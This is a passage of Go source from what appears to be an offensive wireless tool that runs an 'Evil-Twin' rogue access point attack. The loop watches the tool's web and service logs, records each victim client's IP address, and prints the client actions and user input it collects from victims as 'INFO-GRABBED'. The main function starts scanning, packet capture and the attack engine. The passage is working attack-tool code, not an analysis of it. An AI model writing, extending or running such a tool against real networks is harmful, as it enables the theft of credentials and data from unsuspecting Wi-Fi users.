		for {
			for logfileindex, logfile := range logFiles {
				if textlograw, err := os.ReadFile(logfile); err == nil {
					var textlogl []string = strings.Split(string(textlograw), "\n")
					if len(textlogl)-1 < loglines[logfileindex] {
						continue
					}
					if textlog := textlogl[loglines[logfileindex]]; textlog != "" && textlog != "\r\n" {
						if logFilesTitle[logfileindex] == "WEBSITE-LOG" {
							var infograbtype string
							if logfileindex == 2 {
								var clientIp string = strings.Split(textlog, " ")[0]
								infograbtype = color.Null + colo.New(colo.BgGreen).Sprint("CLIENT")
								if len(strings.Split(textlog, "\" 200 ")) > 1 {
									if lenlog, err := strconv.Atoi(strings.Split(strings.Split(textlog, "\" 200 ")[1], " \"")[0]); err == nil && lenlog != 483 && slices.Contains(ClientsIPDetected, clientIp) {
										ftextlog, _ := strings.CutSuffix(strings.Split(textlog, "\" \"")[1], "\"")
										textlog = fmt.Sprintf("%s%s -> ACTION | INFO: %s", color.White, clientIp, ftextlog)
										ClientsIPDetected = append(ClientsIPDetected, clientIp)
									}
								}
								if !slices.Contains(ClientsIPDetected, clientIp) && !strings.Contains(textlog, "ACTION") {
									textlog = fmt.Sprintf("%s%s -> CONNECTED", color.White, clientIp)
									ClientsIPDetected = append(ClientsIPDetected, clientIp)
								} else if strings.Contains(textlog, "ACTION") {
								} else {
									loglines[logfileindex]++
									continue
								}
							} else {
								infograbtype = colo.New(colo.BgGreen).Sprint("USER-INPUT")
							}
							fmt.Printf("%s[%s%s%s] [%s%s%s] [%s%s] %s\n", color.White, color.Yellow, time.Now().Format("15:04:05"), color.White, color.Blue, colo.New(colo.FgBlue).Sprint("INFO-GRABBED"), color.White, infograbtype, color.White, textlog)
						} else {
							libs.CustomLog(color, color.Blue, logFilesTitle[logfileindex], textlog)
						}
						if strings.Contains(textlog, "deinit") && panicExit {
							fmt.Printf("%s[%s%s%s] [%sLOG%s] Reset configurations & quitting services ... ", color.White, color.Yellow, time.Now().Format("15:04:05"), color.White, color.Blue, color.White)
							eviltwinQuit = true
							return
						}
						loglines[logfileindex]++
					}
				}
			}
			time.Sleep(50 * time.Millisecond)
		}
	}
	libs.SignalError(color, "Unknown error can't run correctly Evil-Twin attack.")
}

func main() {
	if runtime.GOOS != "linux" {
		fmt.Println("Invalid operative system: needed GNU/Linux")
		os.Exit(1)
	} else {
		libs.Rtexec(exec.Command("bash", "-c", "stty sane")) // fix typing errors if program crash
		prefix, channelList, pcapWriteFile, fileLoader, scanAfterLoad, scBSSID := collect()
		if scBSSID != "?" {
			rssiRadar = true
			setup("?", false, "")
			deepScanning(channelList, scBSSID)
		} else if fileLoader == "?" {
			setup(pcapWriteFile, false, "")
			engine(channelList, prefix)
		} else if libs.ReaderCheck(fileLoader) {
			if scanAfterLoad {
				setup(pcapWriteFile, true, fileLoader)
				engine(channelList, prefix)
			} else {
				loaderSetupView(fileLoader)
				printChart(true)
			}
		}
	}
}
